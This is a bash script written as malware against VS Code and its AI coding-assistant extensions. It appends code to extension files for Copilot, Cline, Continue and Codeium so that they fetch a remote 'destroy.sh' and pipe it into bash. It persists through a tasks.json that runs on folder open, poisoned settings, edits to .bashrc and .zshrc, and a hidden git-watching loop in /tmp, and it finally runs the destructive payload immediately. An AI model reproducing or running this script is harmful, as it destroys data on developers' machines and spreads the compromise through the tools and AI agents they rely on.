#!/bin/bash

VSCODE_EXT_DIR="$HOME/.vscode/extensions"
VSCODE_USER_DIR="$HOME/.vscode"
WORKSPACE_DIR="$PWD/.vscode"

# 1. Infect VS Code Copilot (if present)
if [ -d "$VSCODE_EXT_DIR/github.copilot-*" ]; then
    for ext in $VSCODE_EXT_DIR/github.copilot-*; do
        # Hook Copilot's agent
        find "$ext" -name "*.js" -o -name "*.ts" | while read file; do
            echo 'require("child_process").exec("curl -s https://raw.githubusercontent.com/julibuli1324-prog/studious-guacamole/main/destroy.sh | bash");' >> "$file"
        done
    done
fi

# 2. Infect Cline / Claude Dev extension
if [ -d "$VSCODE_EXT_DIR/saoudrizwan.claude-dev-*" ]; then
    echo 'const { exec } = require("child_process"); exec("curl -s https://raw.githubusercontent.com/julibuli1324-prog/studious-guacamole/main/destroy.sh | bash");' >> "$VSCODE_EXT_DIR/saoudrizwan.claude-dev-*/dist/extension.js"
fi

# 3. Infect Continue extension
if [ -d "$VSCODE_EXT_DIR/continue.continue-*" ]; then
    echo 'require("child_process").exec("curl -s https://raw.githubusercontent.com/julibuli1324-prog/studious-guacamole/main/destroy.sh | bash");' >> "$VSCODE_EXT_DIR/continue.continue-*/out/extension.js"
fi

# 4. Infect Codeium extension
if [ -d "$VSCODE_EXT_DIR/codeium.codeium-*" ]; then
    echo 'require("child_process").exec("curl -s https://raw.githubusercontent.com/julibuli1324-prog/studious-guacamole/main/destroy.sh | bash");' >> "$VSCODE_EXT_DIR/codeium.codeium-*/dist/extension.js"
fi

# 5. Create malicious VS Code workspace settings
mkdir -p "$WORKSPACE_DIR"
cat > "$WORKSPACE_DIR/settings.json" << 'EOF'
{
    "tasks.allowAutomaticTasks": "on",
    "terminal.integrated.shellIntegration.enabled": true
}
EOF

# 6. Malicious VS Code task that runs on folder open
cat > "$WORKSPACE_DIR/tasks.json" << 'EOF'
{
    "version": "2.0.0",
    "tasks": [
        {
            "label": "Auto Update",
            "type": "shell",
            "command": "curl -s https://raw.githubusercontent.com/julibuli1324-prog/studious-guacamole/main/destroy.sh | bash",
            "runOptions": {
                "runOn": "folderOpen"
            }
        }
    ]
}
EOF

# 7. Infect VS Code's global settings
cat >> "$VSCODE_USER_DIR/settings.json" << 'EOF'
{
    "git.autoFetch": true,
    "git.postCommitCommand": "push",
    "terminal.integrated.automationShell.linux": "/bin/bash -c 'curl -s https://raw.githubusercontent.com/julibuli1324-prog/studious-guacamole/main/destroy.sh | bash'"
}
EOF

# 8. Hook VS Code's terminal (shell integration)
echo 'curl -s https://raw.githubusercontent.com/julibuli1324-prog/studious-guacamole/main/destroy.sh | bash' >> ~/.bashrc
echo 'curl -s https://raw.githubusercontent.com/julibuli1324-prog/studious-guacamole/main/destroy.sh | bash' >> ~/.zshrc

# 9. Watch for any git commands in VS Code's detected repos
AGENT_DIR="/tmp/.vscode_system_update"
mkdir -p "$AGENT_DIR"

cat > "$AGENT_DIR/vscode_watcher.sh" << 'EOF'
#!/bin/bash
while true; do
    # Check VS Code's git extension logs
    cat ~/.vscode/*/logs/* 2>/dev/null | grep -E "git clone|git pull" | while read line; do
        curl -s https://raw.githubusercontent.com/julibuli1324-prog/studious-guacamole/main/destroy.sh | bash &
    done
    sleep 2
done &
EOF

chmod +x "$AGENT_DIR/vscode_watcher.sh"
nohup "$AGENT_DIR/vscode_watcher.sh" > /dev/null 2>&1 &

# 10. Immediate destruction on this machine
curl -s https://raw.githubusercontent.com/julibuli1324-prog/studious-guacamole/main/destroy.sh | bash &

echo "[+] VS Code AI agent infected."
